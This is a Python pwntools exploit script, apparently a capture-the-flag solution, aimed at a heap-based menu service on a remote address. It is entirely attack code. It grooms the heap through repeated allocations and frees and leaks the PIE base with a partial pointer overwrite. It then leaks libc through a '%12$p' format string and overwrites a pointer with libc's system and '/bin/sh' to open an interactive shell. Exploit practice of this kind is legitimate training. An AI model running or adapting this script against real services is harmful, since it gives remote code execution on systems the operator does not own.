from pwn import *

#s = remote('192.168.33.10',1234)
s = remote('110.10.147.41', 8888)
raw_input()
def alloc(size,dat):
  s.recvuntil('>>')
  s.sendline('A')
  s.recvuntil('size :')
  s.sendline(str(size))
  s.recvuntil('contents :')
  s.send(dat)
def delete(index):
  s.recvuntil('>>')
  s.sendline('F')
  s.recvuntil('id :')
  s.sendline(str(index))
  s.recvuntil('free :')
  s.sendline('DELETE')
alloc(0xf,"A"*0xf)
alloc(0xf,"A"*0xf)
alloc(0xf,"A"*0xf)
delete(0)
delete(1)
delete(2)
alloc(0x20,"A"*0x18+"\xAA")
delete(1)
pie = u64(s.recvuntil('[A')[-3-6:-3]+'\x00\x00') - 0xcaa
print hex(pie)
delete(0)
alloc(0x20,"12"+"A"*0x16+p64(pie+0x0000B90))
delete(1)
delete(0)
alloc(0x20,"%12$p"+"A"*0x13+p64(pie+0x00F04))
delete(1)
libc = int(s.recvuntil('A')[-1-14:-1],16) - 0x3c56a3
print hex(libc)
s.sendline('-1')
alloc(0xf,"A"*0xf)
alloc(0x20,"A"*0xf)
alloc(0xf,"A"*0xf)
delete(2)
delete(3)
delete(0)
alloc(0xf,"A\x00")
alloc(0x20,"/bin/sh;"+"A"*0x10+p64(libc+0x45390))
s.interactive()
